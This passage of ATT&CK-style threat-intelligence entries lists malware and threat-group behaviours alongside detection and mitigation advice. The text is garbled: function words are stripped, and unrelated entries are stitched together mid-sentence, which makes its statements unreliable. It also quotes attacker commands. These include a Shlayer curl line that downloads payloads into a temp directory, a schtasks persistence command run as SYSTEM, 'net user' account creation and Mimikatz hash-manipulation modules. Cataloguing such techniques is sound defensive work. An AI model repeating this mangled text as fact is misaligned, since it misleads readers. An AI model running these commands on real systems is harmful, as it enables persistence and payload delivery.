suspicious domains analyze traffic flows follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). (Citation: Unit 42 Gorgon Aug 2018) [StrongPity](https://attack.mitre.org/software/S0491) HTTPS C2 communications.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [OceanSalt](https://attack.mitre.org/software/S0346) delete files system.(Citation: McAfee Oceansalt Oct 2018) (Citation: Trend Micro Tick November 2019) [Zox](https://attack.mitre.org/software/S0672) enumerate files compromised host.(Citation: Novetta-Axiom) [Octopus](https://attack.mitre.org/software/S0340) exfiltrated data file sharing sites.(Citation: ESET Nomadic Octopus 2018) [Impacket](https://attack.mitre.org/software/S0357) modules emulating service execution tools [PsExec](https://attack.mitre.org/software/S0029).(Citation: Impacket Tools) [MiniDuke](https://attack.mitre.org/software/S0051) named pipe communications compromised machine internet access compromised machines.(Citation: ESET Dukes October 2019) [WIRTE](https://attack.mitre.org/groups/G0090) [Empire](https://attack.mitre.org/software/S0363) post-exploitation activities.(Citation: Lab52 WIRTE Apr 2019) [PLEAD](https://attack.mitre.org/software/S0435) ability proxy network communications.(Citation: JPCert PLEAD Downloader June 2018) [CozyCar](https://attack.mitre.org/software/S0046) dropper copies file rundll32.exe install location malware, rundll32.exe load execute main [CozyCar](https://attack.mitre.org/software/S0046) component.(Citation: F-Secure CozyDuke) Monitor newly executed processes [Valid Accounts](https://attack.mitre.org/techniques/T1078) remotely control machines Virtual Network Computing (VNC). example, macOS systems <code>screensharingd</code> process VNC connection activity.(Citation: Apple Unified Log Analysis Remote Login Screen Sharing) [OLDBAIT](https://attack.mitre.org/software/S0138) SMTP C2.(Citation: FireEye APT28) [Earth Lusca](https://attack.mitre.org/groups/G1006) PowerShell execute commands.(Citation: TrendMicro EarthLusca 2022) [QakBot](https://attack.mitre.org/software/S0650) <code>net localgroup</code> enable discovery local groups.(Citation: Kaspersky QakBot September 2021) multi-factor authentication user privileged accounts. embedded network devices support TACACS+ RADIUS.  Follow vendor prescribed practices hardening access control.(Citation: Cisco IOS Software Integrity Assurance - TACACS) Monitor settings unexpected modifications domain trust settings, user application modifies federation settings domain. (Citation: Mandiant APT1) variant [Elise](https://attack.mitre.org/software/S0081) executes <code>dir C:\progra~1</code> initially run.(Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018) [Tonto Team](https://attack.mitre.org/groups/G0131) variety credential dumping tools.(Citation: TrendMicro Tonto Team October 2020)  [Maze](https://attack.mitre.org/software/S0449) Windows API functions encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, others.(Citation: McAfee Maze March 2020)	 [APT29](https://attack.mitre.org/groups/G0016) devices allowed IDs active sync <code>Set-CASMailbox</code>, allowing copies victim mailboxes. additional permissions (such Mail.Read Mail.ReadWrite) compromised Application Service Principals.(Citation: Volexity SolarWinds)(Citation: - Customer Guidance Nation-State Cyber Attacks)(Citation: MSTIC Nobelium Oct 2021) [Epic](https://attack.mitre.org/software/S0091) <code>net view</code> command victim’s machine.(Citation: Kaspersky Turla) (Citation: Bitdefender Naikon April 2021) [Mimikatz](https://attack.mitre.org/software/S0002) credential dumper extended include Skeleton Key domain controller authentication bypass functionality. <code>LSADUMP::ChangeNTLM</code> <code>LSADUMP::SetNTLM</code> modules manipulate password hash account knowing value.(Citation: Adsecurity Mimikatz Guide)(Citation: Metcalf 2015) [Threat Group-3390](https://attack.mitre.org/groups/G0027) PowerShell execution.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Trend Micro DRBControl February 2020) [DropBook](https://attack.mitre.org/software/S0547) legitimate services exfiltrate data.(Citation: BleepingComputer Molerats Dec 2020) [Bazar](https://attack.mitre.org/software/S0534) identity current process compromised host.(Citation: Cybereason Bazar July 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) Python scripts port scanning building reverse shells.(Citation: TrendMicro EarthLusca 2022) [SombRAT](https://attack.mitre.org/software/S0615) ability modify process memory hide process command-line arguments.(Citation: FireEye FiveHands April 2021) (Citation: Netscout Stolen Pencil Dec 2018) encrypting reduce adversaries ability perform tailored data modifications. [Waterbear](https://attack.mitre.org/software/S0579) ability decrypt RC4 encrypted payload execution.(Citation: Trend Micro Waterbear December 2019) Ensure strong password (ideally 25+ characters) complexity service accounts passwords periodically expire. Managed Service Accounts party product password vaulting. (Citation: AdSecurity Cracking Kerberos Dec 2015) [Molerats](https://attack.mitre.org/groups/G0021) actors list active processes victim C2 servers.(Citation: DustySky) (Citation: Proofpoint TA459 April 2017) Clean SID-History attributes legitimate account migration complete.

Consider applying SID Filtering interforest trusts, forest trusts external trusts, exclude SID-History requests access domain resources. SID Filtering ensures authentication requests trust SIDs security principals trusted domain (i.e preventing trusted domain claiming user membership domain).

SID Filtering forest trusts enabled default, disabled child domain transitively access forest trusts. SID Filtering external trusts automatically enabled created external trusts Server 2003 domain controllers. (Citation: Trust Considerations Nov 2014) (Citation: SID Filtering Quarantining Jan 2009) note SID Filtering automatically applied legacy trusts deliberately disabled inter-domain access resources.

SID Filtering applied by: (Citation: Netdom Trust Sept 2012)

* Disabling SIDHistory forest trusts netdom tool (netdom trust /domain: /EnableSIDHistory:no domain controller)

* Applying SID Filter Quarantining external trusts netdom tool (<code>netdom trust <TrustingDomainName> /domain:<TrustedDomainName> /quarantine:yes</code> domain controller)

* Applying SID Filtering domain trusts single forest recommended unsupported configuration breaking changes. (Citation: Netdom Trust Sept 2012) (Citation: AdSecurity Kerberos Aug 2015) domain forest untrustworthy forest. situation split trusted untrusted domains separate forests SID Filtering applied interforest trust [Small Sieve](https://attack.mitre.org/software/S1035) SSL/TLS HTTPS Telegram Bot API-based C2 channel.(Citation: DHS CISA AA22-055A MuddyWater February 2022) Monitor newly constructed drive letters mount data storage device attempts write sensitive locations partition boot sector, master boot record, disk partition table, BIOS parameter block/superblock. [Seasalt](https://attack.mitre.org/software/S0345) custom binary protocol C2.(Citation: Mandiant APT1 Appendix) [Ursnif](https://attack.mitre.org/software/S0386) injected code target processes thread local storage callbacks.(Citation: TrendMicro Ursnif Mar 2015)(Citation: TrendMicro PE_URSNIF.A2)(Citation: FireEye Ursnif Nov 2017) [Kessel](https://attack.mitre.org/software/S0487) collected architecture, OS version, MAC address information.(Citation: ESET ForSSHe December 2018) [Nebulae](https://attack.mitre.org/software/S0630) enumerate processes target system.(Citation: Bitdefender Naikon April 2021) Monitor logon behavior (ex: EID 4624 Logon Type 3) [Valid Accounts](https://attack.mitre.org/techniques/T1078) interact remote network share Server Message Block (SMB). adversary perform actions logged-on user. Ensure proper logging accounts log systems centrally collected. Windows logging collect success/failure accounts laterally collected tools Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) (Citation: FireEye APT33 Guardrail)(Citation: Holmium June 2020) [SMOKEDHAM](https://attack.mitre.org/software/S0649) continuously capture keystrokes.(Citation: FireEye Shining Light DARKSIDE 2021)(Citation: FireEye SMOKEDHAM June 2021) [OSX/Shlayer](https://attack.mitre.org/software/S0402) bash scripts check macOS version, download payloads, extract bytes files. [OSX/Shlayer](https://attack.mitre.org/software/S0402) command <code>sh -c tail -c +1381...</code> extract bytes offset file. [OSX/Shlayer](https://attack.mitre.org/software/S0402) <code>curl -fsL "$url" >$tmp_path</code> command download malicious payloads temporary directory.(Citation: Carbon Black Shlayer Feb 2019)(Citation: sentinelone shlayer zshlayer)(Citation: 20 macOS Common Tools Techniques)(Citation: objectivesee osx.shlayer apple approved 2020) [AADInternals](https://attack.mitre.org/software/S0677) create backdoor converting domain federated domain authenticate user tenant. [AADInternals](https://attack.mitre.org/software/S0677) modify DesktopSSO information.(Citation: AADInternals Documentation)(Citation: Azure Federation Vulnerability) (Citation: Malwarebytes Higaisa 2020)(Citation: PTSecurity Higaisa 2020) [Pandora](https://attack.mitre.org/software/S0664) communicate HTTP.(Citation: Trend Micro Iron Tiger April 2021) collect victim user name.(Citation: FireEye APT37 Feb 2018) [Tomiris](https://attack.mitre.org/software/S0671) ability collect files matching hardcoded list extensions prior exfiltration.(Citation: Kaspersky Tomiris Sep 2021) [Saint Bot](https://attack.mitre.org/software/S1018) packed dark market crypter.(Citation: Malwarebytes Saint Bot April 2021) [Bisonal](https://attack.mitre.org/software/S0268) retrieve file listing system.(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020)  monitoring processes tscon.exe usage Monitor processes inject malicious code processes asynchronous procedure (APC) queue evade process-based defenses elevate privileges. [HEXANE](https://attack.mitre.org/groups/G1001) compromised accounts send spearphishing emails.(Citation: SecureWorks August 2019) [MuddyWater](https://attack.mitre.org/groups/G0069) stored decoy PDF file victim's `%temp%` folder.(Citation: Talos MuddyWater Jan 2022) [RATANKBA](https://attack.mitre.org/software/S0241) WMI perform process monitoring.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) (Citation: FireEye FIN6 April 2016) [MiniDuke](https://attack.mitre.org/software/S0051) enumerate local drives.(Citation: ESET Dukes October 2019) Collect analyze signing certificate metadata software executes environment unusual certificate characteristics outliers. [GoldenSpy](https://attack.mitre.org/software/S0493) packaged legitimate tax preparation software.(Citation: Trustwave GoldenSpy June 2020) [BitPaymer](https://attack.mitre.org/software/S0570) tokens users create processes infected systems.(Citation: Crowdstrike Indrik November 2018) [Ursnif](https://attack.mitre.org/software/S0386) crypto key stored Registry decrypt Tor clients dropped disk.(Citation: ProofPoint Ursnif Aug 2016) [FoggyWeb](https://attack.mitre.org/software/S0661) abuse compromised FS server's SAML token.(Citation: MSTIC FoggyWeb September 2021) [Inception](https://attack.mitre.org/groups/G0100) lured victims clicking malicious files machine reconnaissance execute malware.(Citation: Kaspersky Cloud Atlas December 2014)(Citation: Kaspersky Cloud Atlas August 2019)(Citation: Symantec Inception Framework March 2018)(Citation: Unit 42 Inception November 2018) Enforce proxies dedicated servers services DNS systems communicate respective ports/protocols, systems network. [Penquin](https://attack.mitre.org/software/S0587) mimicked Cron binary hide compromised systems.(Citation: Leonardo Turla Penquin 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) [Tasklist](https://attack.mitre.org/software/S0057) compromised host.(Citation: TrendMicro EarthLusca 2022) [Avaddon](https://attack.mitre.org/software/S0640) bypasses UAC CMSTPLUA interface.(Citation: Arxiv Avaddon Feb 2021)  [TinyZBot](https://attack.mitre.org/software/S0004) screen capture functionality.(Citation: Cylance Cleaver) [Lizar](https://attack.mitre.org/software/S0681) collect username system.(Citation: BiZone Lizar 2021)  Monitor API calls (such <code>RegOpenKeyExA</code>) interact Windows Registry gather system, configuration, installed software.  [APT32](https://attack.mitre.org/groups/G0050) hidden non-printing characters masquerade service names, appending Unicode no-break space character legitimate service name. [APT32](https://attack.mitre.org/groups/G0050) impersonated legitimate Flash installer file "install_flashplayer.exe".(Citation: FireEye APT32 2017) [Earth Lusca](https://attack.mitre.org/groups/G1006) command <code>schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system</code> persistence.(Citation: TrendMicro EarthLusca 2022) [UNC2452](https://attack.mitre.org/groups/G0118) <code>Get-ManagementRoleAssignment</code> PowerShell cmdlet enumerate Exchange management role assignments Exchange Management Shell.(Citation: Volexity SolarWinds) [LazyScripter](https://attack.mitre.org/groups/G0140) VBScript execute malicious code.(Citation: MalwareBytes LazyScripter Feb 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware unusual data transfer tools protocols FTP mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. (Citation: University Birmingham C2) [LookBack](https://attack.mitre.org/software/S0582) C2 proxy tool masquerades <code>GUP.exe</code>, software Notepad++.(Citation: Proofpoint LookBack Malware Aug 2019) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) relied victims malicious links e-mails execution.(Citation: Google EXOTIC LILY March 2022) Monitor library metadata, hash, compare libraries loaded process execution time previous executions detect differences correlate patching updates. [Naikon](https://attack.mitre.org/groups/G0019) RoyalRoad exploit builder drop stage loader, intel.wll, Word Startup folder compromised host.(Citation: CheckPoint Naikon 2020) [ROKRAT](https://attack.mitre.org/software/S0240) steal credentials leveraging Windows Vault mechanism.(Citation: Talos Group123) Deny direct remote access internal systems network proxies, gateways, firewalls. binaries service executables occur software updates. executable written, renamed, moved match existing service executable, detected correlated suspicious behavior. Hashing binaries service executables detect replacement historical data. [ADVSTORESHELL](https://attack.mitre.org/software/S0045) create remote command.(Citation: ESET Sednit 2)(Citation: Bitdefender APT28 Dec 2015) [Dragonfly](https://attack.mitre.org/groups/G0035) collected data local victim systems.(Citation: US-CERT TA18-074A) [TA505](https://attack.mitre.org/groups/G0092) JavaScript code execution.(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018) [NOKKI](https://attack.mitre.org/software/S0353) Base64 encoding strings.(Citation: Unit 42 NOKKI Sept 2018) application control appropriate. [TeamTNT](https://attack.mitre.org/groups/G0139) deployed privileged containers mount filesystem victim machine.(Citation: Intezer TeamTNT September 2020)(Citation: Aqua TeamTNT August 2020) [Exaramel Linux](https://attack.mitre.org/software/S0401) decrypt configuration file.(Citation: ANSSI Sandworm January 2021) [MuddyWater](https://attack.mitre.org/groups/G0069) malware capture screenshots victim’s machine.(Citation: Securelist MuddyWater Oct 2018) (Citation: PLATINUM April 2016) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)).  [APT32](https://attack.mitre.org/groups/G0050) GetPassword_x64 harvest credentials.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [Dridex](https://attack.mitre.org/software/S0384) backconnect module tunneling network traffic victim's computer. Infected computers P2P botnet relay C2 traffic infected peers.(Citation: Dell Dridex Oct 2015)(Citation: Checkpoint Dridex Jan 2021)  Enable AES Kerberos encryption (or stronger encryption algorithm), RC4, possible. (Citation: AdSecurity Cracking Kerberos Dec 2015) [Threat Group-3390](https://attack.mitre.org/groups/G0027) appcmd.exe disable logging victim server.(Citation: SecureWorks BRONZE UNION June 2017) [SeaDuke](https://attack.mitre.org/software/S0053) securely delete files, including deleting victim.(Citation: Symantec Seaduke 2015) [Mustang Panda](https://attack.mitre.org/groups/G0129) customized [PlugX](https://attack.mitre.org/software/S0013) variant exfiltrate documents air-gapped networks.(Citation: Avira Mustang Panda January 2020) Routinely check user permissions ensure expected users capability create snapshots backups. [Small Sieve](https://attack.mitre.org/software/S1035) Python scripts execute commands.(Citation: NCSC GCHQ Sieve Jan 2022) [Stuxnet](https://attack.mitre.org/software/S0603) sends compromised victim HTTP.(Citation: Symantec W.32 Stuxnet Dossier) [POWERSTATS](https://attack.mitre.org/software/S0223) encoded C2 traffic base64.(Citation: Unit 42 MuddyWater Nov 2017) Adversaries payloads execute technique. Identify block malicious software executed hijacking application control solutions capable blocking libraries loaded legitimate software. [APT38](https://attack.mitre.org/groups/G0082) modified data timestamps mimic files folder compromised host.(Citation: CISA AA20-239A BeagleBoyz August 2020) disabling DCOM Dcomcnfg.exe.(Citation: Disable DCOM) [Empire](https://attack.mitre.org/software/S0363) shared drives local system.(Citation: Github PowerShell Empire) Monitor unexpected files manipulated data manipulate external outcomes hide activity [Ke3chang](https://attack.mitre.org/groups/G0004) performed local network configuration discovery <code>ipconfig</code>.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021) [POWERSTATS](https://attack.mitre.org/software/S0223) connected C2 servers proxies.(Citation: FireEye MuddyWater Mar 2018) [Tarrask](https://attack.mitre.org/software/S1011) creates scheduled task called “WinUpdate” re-establish dropped  C2 connections.(Citation: Tarrask scheduled task) [Silence](https://attack.mitre.org/groups/G0091) RAdmin, remote software tool remotely control workstations ATMs.(Citation: IB Silence Sept 2018) [MobileOrder](https://attack.mitre.org/software/S0079) command upload running processes C2 server.(Citation: Scarlet Mimic Jan 2016) [Deep Panda](https://attack.mitre.org/groups/G0009) PowerShell scripts download execute programs memory, writing disk.(Citation: Alperovitch 2014) [ComRAT](https://attack.mitre.org/software/S0126) ability Gmail UI receive commands exfiltrate information.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020) [Ebury](https://attack.mitre.org/software/S0377) automatically exfiltrate gathered SSH credentials.(Citation: ESET Windigo Mar 2014) [Indrik Spider](https://attack.mitre.org/groups/G0119) PowerShell [Empire](https://attack.mitre.org/software/S0363) execution malware.(Citation: Crowdstrike Indrik November 2018)(Citation: Symantec WastedLocker June 2020)  [Orz](https://attack.mitre.org/software/S0229) gather victim's Internet Explorer version.(Citation: Proofpoint Leviathan Oct 2017) [Ferocious](https://attack.mitre.org/software/S0679) checked AV software persistence process.(Citation: Kaspersky WIRTE November 2021) [RainyDay](https://attack.mitre.org/software/S0629) tools collect credentials browsers.(Citation: Bitdefender Naikon April 2021) [GoldenSpy](https://attack.mitre.org/software/S0493)'s setup file installs initial executables folder <code>%WinDir%\System32\PluginManager</code>.(Citation: Trustwave GoldenSpy June 2020)	 [Tropic Trooper](https://attack.mitre.org/groups/G0081) Windows command scripts.(Citation: TrendMicro Tropic Trooper 2020)	 [Flagpro](https://attack.mitre.org/software/S0696) download malicious files .tmp extension append .exe prior execution.(Citation: NTT Security Flagpro December 2021) [Okrum](https://attack.mitre.org/software/S0439) collect name, locale information, OS architecture.(Citation: ESET Okrum July 2019) [NETWIRE](https://attack.mitre.org/software/S0198) discover processes compromised hosts.(Citation: FireEye NETWIRE March 2019) 
[QuasarRAT](https://attack.mitre.org/software/S0262) generate UAC pop-up Window prompt target user command administrator.(Citation: CISA AR18-352A Quasar RAT December 2018) [Empire](https://attack.mitre.org/software/S0363) modules discover exploit search hijacking vulnerabilities.(Citation: Github PowerShell Empire) Disable RDP service unnecessary. Inventory workstations unauthorized VNC server software. [ZxShell](https://attack.mitre.org/software/S0412) launch port scans.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)  [OilRig](https://attack.mitre.org/groups/G0049) exfiltrated data FTP separately primary C2 channel DNS.(Citation: Palo Alto OilRig Oct 2016) Monitor unexpected deletion Windows event logs (via native binaries) generate alterable event (Event 1102: "The audit log cleared") [Comnie](https://attack.mitre.org/software/S0244) executes <code>netstat -ano</code> command.(Citation: Palo Alto Comnie) [ShimRat](https://attack.mitre.org/software/S0444) sleep instructed C2.(Citation: FOX-IT 2016 Mofang)	 [Small Sieve](https://attack.mitre.org/software/S1035) ability add `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift` persistence.(Citation: NCSC GCHQ Sieve Jan 2022) [Bankshot](https://attack.mitre.org/software/S0239) creates processes Windows API calls: CreateProcessA() CreateProcessAsUserA().(Citation: McAfee Bankshot) [Bumblebee](https://attack.mitre.org/software/S1039) download execute additional payloads including `Dex` command.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022) [HotCroissant](https://attack.mitre.org/software/S0431) perform dynamic DLL importing API lookups <code>LoadLibrary</code> <code>GetProcAddress</code> obfuscated strings.(Citation: US-CERT HOTCROISSANT February 2020) 
(Citation: CrowdStrike Carbon Spider August 2021) Monitor newly constructed files deface systems external organization attempt deliver messaging, intimidate, mislead organization users. OsInfo function [Komplex](https://attack.mitre.org/software/S0162) collects current running username.(Citation: Sofacy Komplex Trojan) [Conti](https://attack.mitre.org/software/S0575) discover files local system.(Citation: CarbonBlack Conti July 2020) [Chimera](https://attack.mitre.org/groups/G0114) collected documents victim's SharePoint.(Citation: NCC Chimera January 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors valid VPN credentials gain initial access.(Citation: FoxIT Wocao December 2019) Monitor emond rules creation checking files created <code>/etc/emond.d/rules/</code> <code>/private/var/db/emondClients</code>. remote access SSH root privileged accounts. [Skidmap](https://attack.mitre.org/software/S0468) ability check infected system’s OS Debian RHEL/CentOS determine cryptocurrency miner use.(Citation: Trend Micro Skidmap) [FIN4](https://attack.mitre.org/groups/G0085) created rules victims' Outlook accounts automatically delete emails “hacked," "phish," “malware" attempt prevent organizations communicating activities.(Citation: FireEye Hacking FIN4 Dec 2014) [Misdat](https://attack.mitre.org/software/S0083) capable deleting backdoor file.(Citation: Cylance Dust Storm) [WinMM](https://attack.mitre.org/software/S0059) configured primary backup domains C2 communications.(Citation: Baumgartner Naikon 2015) Cloud service providers customers deactivate unused regions.(Citation: CloudSploit - Unused AWS Regions) [ShimRatReporter](https://attack.mitre.org/software/S0445) LZ compression compress initial reconnaissance reports sending C2.(Citation: FOX-IT 2016 Mofang)	 [SMOKEDHAM](https://attack.mitre.org/software/S0649) <code>reg.exe</code> create Registry key.(Citation: FireEye SMOKEDHAM June 2021) [Bad Rabbit](https://attack.mitre.org/software/S0606) enumerate running processes compare hashes.(Citation: Secure List Bad Rabbit) [Astaroth](https://attack.mitre.org/software/S0373) launch DLL Search Hijacking.(Citation: Securelist Brazilian Banking Malware July 2020) Anti-virus automatically quarantine suspicious files.  [Avenger](https://attack.mitre.org/software/S0473) ability decrypt files downloaded C2.(Citation: Trend Micro Tick November 2019) [APT32](https://attack.mitre.org/groups/G0050) legitimate local admin account credentials.(Citation: FireEye APT32 2017) [SombRAT](https://attack.mitre.org/software/S0615) execute <code>getinfo</code>  identify username compromised host.(Citation: BlackBerry CostaRicto November 2020)(Citation: CISA AR21-126A FIVEHANDS 2021) [Gelsemium](https://attack.mitre.org/software/S0666) ability DNS communication C2.(Citation: ESET Gelsemium June 2021) [AppleJeus](https://attack.mitre.org/software/S0584) collected victim host infection.(Citation: CISA AppleJeus Feb 2021) Monitor abnormal process creations, Command Scripting Interpreter spawning exploited application. behavior successful compromise, abnormal behavior processes. (Citation: MSTIC Nobelium Oct 2021) [Cobalt Group](https://attack.mitre.org/groups/G0080) powershell.exe download execute scripts.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017)(Citation: RiskIQ Cobalt Jan 2018)(Citation: TrendMicro Cobalt Nov 2017) Ensure wired wireless traffic encrypted appropriately. practices authentication protocols, Kerberos, ensure traffic credentials protected SSL/TLS. [JHUHUGIT](https://attack.mitre.org/software/S0044) registered Windows script Registry key <code>HKCU\Environment\UserInitMprLogonScript</code> establish persistence.(Citation: ESET Sednit 1)(Citation: Talos Seduploader Oct 2017) [SUNSPOT](https://attack.mitre.org/software/S0562) replaces SolarWinds Orion source code MD5 checksums original source code file backdoored replacement source code match hardcoded values.(Citation: CrowdStrike SUNSPOT Implant January 2021)  [SDBbot](https://attack.mitre.org/software/S0461) collected country code compromised machine.(Citation: Korean FSI TA505 2020) (Citation: ThreatConnect Anthem) (Citation: Symantec Thrip June 2018) [Naid](https://attack.mitre.org/software/S0205) collects unique identifier (UID) compromised host.(Citation: Symantec Naid June 2012) [Denis](https://attack.mitre.org/software/S0354) replaces nonexistent Windows DLL "msfte.dll" malicious version, loaded SearchIndexer.exe SearchProtocolHost.exe.(Citation: Cybereason Cobalt Kitty 2017) [POSHSPY](https://attack.mitre.org/software/S0150) appends file signature header (randomly selected file types) encrypted data prior upload download.(Citation: FireEye POSHSPY April 2017) [SILENTTRINITY](https://attack.mitre.org/software/S0692) create backdoor KeePass malicious config file TortoiseSVN registry hook.(Citation: GitHub SILENTTRINITY Modules July 2019) [Axiom](https://attack.mitre.org/groups/G0001) RDP operations.(Citation: Novetta-Axiom) [LightNeuron](https://attack.mitre.org/software/S0395) gathers victim Win32 API <code>GetComputerName</code>.(Citation: ESET LightNeuron 2019) [Dacls](https://attack.mitre.org/software/S0497) encrypt configuration file AES CBC.(Citation: TrendMicro macOS Dacls 2020) [menuPass](https://attack.mitre.org/groups/G0045) <code>InstallUtil.exe</code> execute malicious software.(Citation: PWC Cloud Hopper Technical Annex April 2017) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) enumerate files directories.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [Fox Kitten](https://attack.mitre.org/groups/G0117) scripts access credential KeePass database.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [HOPLIGHT](https://attack.mitre.org/software/S0376) C2 channel exfiltrate data.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Lazarus Group](https://attack.mitre.org/groups/G0032) collected email addresses belonging departments targeted organization follow-on phishing campaigns.(Citation: Kaspersky ThreatNeedle Feb 2021) [InvisiMole](https://attack.mitre.org/software/S0260) JavaScript file execution chain.(Citation: ESET InvisiMole June 2020) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) list files directories.(Citation: ESET Sednit 2)(Citation: Bitdefender APT28 Dec 2015) technique remotely, adversary conjunction RDP. Ensure Network Level Authentication enabled force remote desktop session authenticate session created login screen displayed. enabled default Windows Vista later. (Citation: TechNet RDP NLA) [FIN6](https://attack.mitre.org/groups/G0037) deployed utility script named <code>kill.bat</code> disable anti-virus.(Citation: FireEye FIN6 Apr 2019) [Lokibot](https://attack.mitre.org/software/S0447) modified Registry UAC bypass process.(Citation: Talos Lokibot Jan 2021)  [Bazar](https://attack.mitre.org/software/S0534) loader download execute [Bazar](https://attack.mitre.org/software/S0534) backdoor.(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020) [Rancor](https://attack.mitre.org/groups/G0075) launched scheduled task gain persistence <code>schtasks /create /sc</code> command.(Citation: Rancor Unit42 June 2018) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) samples standard Base64 + bzip2, standard Base64 + reverse XOR + RSA-2048 decrypt data received C2 servers.(Citation: Symantec Dragonfly) [APT32](https://attack.mitre.org/groups/G0050) conducted targeted surveillance activists bloggers.(Citation: Amnesty Intl. Ocean Lotus February 2021) [ZxShell](https://attack.mitre.org/software/S0412) create Registry entries enable services run.(Citation: Talos ZxShell Oct 2014) [Naikon](https://attack.mitre.org/groups/G0019) commands <code>netsh interface show</code> discover network interface settings.(Citation: Baumgartner Naikon 2015) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors spearphishing emails contained malicious Word document.(Citation: Cylance Dust Storm) [SUNBURST](https://attack.mitre.org/software/S0559) strings compressed encoded Base64.(Citation: Analyzing Solorigate Dec 2020) [SUNBURST](https://attack.mitre.org/software/S0559) obfuscated collected FNV-1a + XOR algorithm.(Citation: FireEye SUNBURST Backdoor December 2020) (Citation: Villeneuve 2014) [Shark](https://attack.mitre.org/software/S1019) upload files C2.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [Naikon](https://attack.mitre.org/groups/G0019) disguised malicious programs Google Chrome, Adobe, VMware executables.(Citation: Bitdefender Naikon April 2021) Enforce principle least-privilege. implementing access control mechanisms include authentication authorization. [FinFisher](https://attack.mitre.org/software/S0182) enumerates directories scans files.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [Windshift](https://attack.mitre.org/groups/G0112) malware identify installed software.(Citation: BlackBerry Bahamut) [APT28](https://attack.mitre.org/groups/G0007) publicly tool gather compress multiple documents DCCC DNC networks.(Citation: DOJ GRU Indictment Jul 2018) Monitor LNK files created Zone Identifier 1, LNK file originated network.(Citation: BSidesSLC 2020 - LNK Elastic) Analysis attempt relate shortcut creation events suspicious events based adversary behavior process launches unknown executables network connections. [Grandoreiro](https://attack.mitre.org/software/S0531) list installed security products including Trusteer Diebold Warsaw GAS Tecnologia online banking protections.(Citation: ESET Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [Donut](https://attack.mitre.org/software/S0695) download staged shellcode payloads.(Citation: Donut Github) [Zox](https://attack.mitre.org/software/S0672) ability SMB communication.(Citation: Novetta-Axiom) [Meteor](https://attack.mitre.org/software/S0688) `WinAPI` remove victim machine Active Directory domain.(Citation: Check Meteor Aug 2021) [Crimson](https://attack.mitre.org/software/S0115) command perform screen captures.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net user` command gather account information.(Citation: Cybereason OperationCuckooBees 2022)  <code>net user username \password</code> commands [Net](https://attack.mitre.org/software/S0039) create local account.(Citation: Savill 1999) [Hildegard](https://attack.mitre.org/software/S0601) disguised Linux process.(Citation: Unit 42 Hildegard Malware) [Confucius](https://attack.mitre.org/groups/G0142) exploited Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, CVE-2018-0802.(Citation: Uptycs Confucius APT Jan 2021)(Citation: TrendMicro Confucius APT Feb 2018) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) gather device serial checked ensure disk space Unix utility `df`.(Citation: SentinelLabs reversing run-only applescripts 2021) (Citation: PWC Cloud Hopper Technical Annex April 2017) link visited user, network intrusion prevention systems systems designed scan remove malicious downloads block activity. [BLINDINGCAN](https://attack.mitre.org/software/S0520) deleted artifacts victim machines.(Citation: US-CERT BLINDINGCAN Aug 2020) [MoleNet](https://attack.mitre.org/software/S0553) perform WMI commands system.(Citation: Cybereason Molerats Dec 2020) [Kazuar](https://attack.mitre.org/software/S0265) gathers users.(Citation: Unit 42 Kazuar 2017) [Remcos](https://attack.mitre.org/software/S0332) RC4 base64 obfuscate data, including Registry entries file paths.(Citation: Talos Remcos Aug 2018) [RDFSNIFFER](https://attack.mitre.org/software/S0416) hooks Win32 API functions hijack elements remote management user-interface.(Citation: FireEye FIN7 Oct 2019) [APT32](https://attack.mitre.org/groups/G0050) scheduled task 